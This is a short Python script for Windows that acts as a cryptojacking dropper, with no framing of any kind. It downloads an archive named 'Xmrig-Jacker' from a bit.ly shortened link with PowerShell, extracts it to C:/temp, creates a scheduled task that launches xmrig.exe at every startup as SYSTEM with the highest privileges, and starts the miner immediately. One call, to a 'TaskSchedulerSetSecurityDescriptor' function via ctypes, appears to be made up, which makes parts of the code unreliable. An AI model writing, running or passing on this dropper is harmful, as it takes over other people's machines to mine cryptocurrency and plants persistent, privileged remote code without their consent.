import os
import subprocess
import shutil
import ctypes
import time

def download_and_extract(url, output_dir):
    subprocess.run(["powershell", "Invoke-WebRequest", url, "-OutFile", os.path.join(output_dir, "Xmrig-Jacker-main.zip")])
    shutil.unpack_archive(os.path.join(output_dir, "Xmrig-Jacker-main.zip"), output_dir)

def set_process_priority(pid, priority):
    subprocess.run(["wmic", "process", "where", f"ProcessId={pid}", "CALL", f"SetPriority {priority}"])

def main():
    temp_dir = "C:/temp"
    xmrig_path = os.path.join(temp_dir, "Xmrig-Jacker-main", "xmrig", "xmrig.exe")

    download_url = 'https://bit.ly/444WCb3'
    download_and_extract(download_url, temp_dir)

    action = f'"{xmrig_path}"'
    ctypes.windll.taskschd.TaskSchedulerSetSecurityDescriptor(None, 4)
    subprocess.run(["schtasks", "/Create", "/TN", "RunXmrig", "/SC", "ONSTART", "/RU", "SYSTEM", "/RL", "HIGHEST", "/TR", action])

    # Start the xmrig.exe process immediately
    subprocess.Popen([xmrig_path])

if __name__ == "__main__":
    main()
